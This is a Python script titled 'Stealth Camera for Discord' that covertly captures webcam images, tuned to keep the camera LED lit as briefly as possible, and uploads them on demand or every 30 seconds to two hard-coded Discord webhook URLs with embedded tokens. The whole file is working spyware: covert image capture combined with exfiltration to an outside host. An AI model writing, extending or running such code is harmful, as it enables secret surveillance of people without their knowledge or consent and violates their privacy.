import cv2
import requests
from io import BytesIO
import time
from datetime import datetime
import threading

# Discord webhooks
DISCORD_WEBHOOKS = [
    "https://discordapp.com/api/webhooks/1464318526650187836/JVj45KwndFltWM8WZeD3z9e0dlIipcbyQN7Fu_iAt5HpBn1O5f4t_r43koMeX3Dv73gF",
    "https://discord.com/api/webhooks/1464318888714961091/dElHOxtS91PyvPZR3DQRcSNzD0di6vIlTr3qfHs-DUSEutmHxF9jEPJ7BMrWwhthbLf0"
]

class StealthCamera:
    def __init__(self):
        self.camera = None
        self.last_capture = None
        
    def quick_capture(self):
        """Ultra-fast capture to minimize camera LED time."""
        try:
            # Open camera with minimal settings
            self.camera = cv2.VideoCapture(0)
            
            if not self.camera.isOpened():
                print("Error: Could not open camera.")
                return None
            
            # Set to lowest resolution for speed
            self.camera.set(cv2.CAP_PROP_FRAME_WIDTH, 320)
            self.camera.set(cv2.CAP_PROP_FRAME_HEIGHT, 240)
            
            # Disable autofocus for speed (if available)
            self.camera.set(cv2.CAP_PROP_AUTOFOCUS, 0)
            
            # Grab a few frames to let camera adjust quickly
            for _ in range(3):
                self.camera.grab()
            
            # Capture frame - LED will activate here
            ret, frame = self.camera.read()
            
            # Release camera IMMEDIATELY - LED should turn off
            self.camera.release()
            self.camera = None
            
            if not ret:
                print("Error: Could not capture image.")
                return None
            
            return frame
            
        except Exception as e:
            print(f"Capture error: {e}")
            if self.camera:
                self.camera.release()
                self.camera = None
            return None
    
    def capture_with_prewarm(self, warm_frames=10):
        """
        Alternative: Pre-warm camera in background thread,
        then capture quickly.
        """
        def prewarm_camera():
            """Open and close camera quickly to pre-warm."""
            try:
                cam = cv2.VideoCapture(0)
                if cam.isOpened():
                    # Set low resolution
                    cam.set(cv2.CAP_PROP_FRAME_WIDTH, 320)
                    cam.set(cv2.CAP_PROP_FRAME_HEIGHT, 240)
                    
                    # Grab frames without reading
                    for _ in range(warm_frames):
                        cam.grab()
                    
                    cam.release()
            except:
                pass
        
        # Start pre-warming in background
        prewarm_thread = threading.Thread(target=prewarm_camera)
        prewarm_thread.daemon = True
        prewarm_thread.start()
        
        # Wait a moment
        time.sleep(0.1)
        
        # Now do the actual capture
        return self.quick_capture()
    
    def capture_no_preview(self):
        """
        Capture without any preview or display windows
        that might trigger longer camera activation.
        """
        return self.quick_capture()

def send_to_discord(image, webhook_url, message=None):
    """Send image to a Discord webhook."""
    if image is None:
        return False
        
    # Encode image to JPEG format in memory
    ret, buffer = cv2.imencode('.jpg', image, [cv2.IMWRITE_JPEG_QUALITY, 85])
    
    if not ret:
        print("Error: Could not encode image.")
        return False
    
    # Create a BytesIO object from the buffer
    image_bytes = BytesIO(buffer.tobytes())
    
    # Prepare files for Discord
    files = {
        'file': ('camera_image.jpg', image_bytes, 'image/jpeg')
    }
    
    # Prepare data (optional message)
    data = {}
    if message:
        data['content'] = message
    
    try:
        response = requests.post(webhook_url, files=files, data=data)
        
        if response.status_code == 204:
            print(f"✓ Image sent successfully!")
            return True
        else:
            print(f"✗ Error: Status {response.status_code}")
            print(f"Response: {response.text}")
            return False
            
    except requests.exceptions.RequestException as e:
        print(f"✗ Request error: {e}")
        return False

def stealth_capture_and_send():
    """Capture and send with minimal camera activation."""
    print("🕵️ Stealth capture in progress...")
    
    camera = StealthCamera()
    
    # Method 1: Quickest capture (LED on for shortest time)
    print("⚡ Quick capture...")
    image = camera.quick_capture()
    
    # Alternative: Uncomment for pre-warming
    # print("⚡ Pre-warming and capturing...")
    # image = camera.capture_with_prewarm()
    
    if image is None:
        print("✗ Failed to capture image.")
        return
    
    # Create timestamp message
    timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    message = f"Stealth capture at {timestamp}"
    
    # Send to all webhooks
    success_count = 0
    for i, webhook_url in enumerate(DISCORD_WEBHOOKS, 1):
        print(f"📤 Sending to webhook {i}...")
        if send_to_discord(image, webhook_url, message):
            success_count += 1
    
    print(f"✅ Successfully sent to {success_count}/{len(DISCORD_WEBHOOKS)} webhooks.")

def continuous_stealth_capture(interval_seconds=30):
    """Continuous stealth captures."""
    print("🔁 Starting continuous stealth mode...")
    print("⚠️ Note: Camera LED will flash briefly for each capture")
    print(f"⏱️ Interval: {interval_seconds} seconds")
    print("🛑 Press Ctrl+C to stop\n")
    
    camera = StealthCamera()
    
    try:
        while True:
            print(f"\n[{datetime.now().strftime('%H:%M:%S')}] Capturing...")
            image = camera.quick_capture()
            
            if image is not None:
                timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
                message = f"Auto capture at {timestamp}"
                
                for webhook_url in DISCORD_WEBHOOKS:
                    send_to_discord(image, webhook_url, message)
            
            # Wait for next capture
            if interval_seconds > 5:
                print(f"⏳ Waiting {interval_seconds} seconds...")
                for remaining in range(interval_seconds, 0, -1):
                    print(f"   {remaining} seconds remaining", end='\r')
                    time.sleep(1)
            else:
                time.sleep(interval_seconds)
                
    except KeyboardInterrupt:
        print("\n\n🛑 Stopped by user.")
    except Exception as e:
        print(f"\n⚠️ Unexpected error: {e}")

if __name__ == "__main__":
    # Required packages: pip install opencv-python requests
    
    print("🕵️  Stealth Camera for Discord")
    print("=" * 40)
    print("⚠️ Important: Camera LED cannot be disabled via software")
    print("   This script minimizes LED activation time\n")
    
    # Test if camera exists
    test_cap = cv2.VideoCapture(0)
    if not test_cap.isOpened():
        print("✗ Error: No camera found or camera is in use.")
        exit(1)
    test_cap.release()
    print("✓ Camera detected")
    
    # Choose mode
    print("\nSelect mode:")
    print("1. Single stealth capture (LED flashes briefly)")
    print("2. Continuous stealth mode")
    print("3. Test capture speed")
    
    try:
        choice = input("Enter choice (1-3): ").strip()
        
        if choice == '1':
            stealth_capture_and_send()
            
        elif choice == '2':
            try:
                interval = int(input("Enter interval in seconds (default: 30): ") or "30")
                if interval < 5:
                    print("⚠️ Warning: Very short intervals may cause issues")
                    confirm = input("Continue? (y/n): ").lower()
                    if confirm != 'y':
                        exit()
            except ValueError:
                interval = 30
            continuous_stealth_capture(interval)
            
        elif choice == '3':
            print("\n⏱️ Testing capture speed...")
            camera = StealthCamera()
            times = []
            
            for i in range(3):
                print(f"Test {i+1}/3...")
                start = time.time()
                image = camera.quick_capture()
                end = time.time()
                
                if image is not None:
                    capture_time = (end - start) * 1000
                    times.append(capture_time)
                    print(f"  Capture took: {capture_time:.0f}ms")
                else:
                    print("  Failed")
            
            if times:
                avg = sum(times) / len(times)
                print(f"\n📊 Average capture time: {avg:.0f}ms")
                print(f"📷 Camera LED active for ~{avg:.0f}ms per capture")
            else:
                print("✗ All tests failed")
                
        else:
            print("Invalid choice.")
            
    except KeyboardInterrupt:
        print("\n\n🛑 Cancelled.")
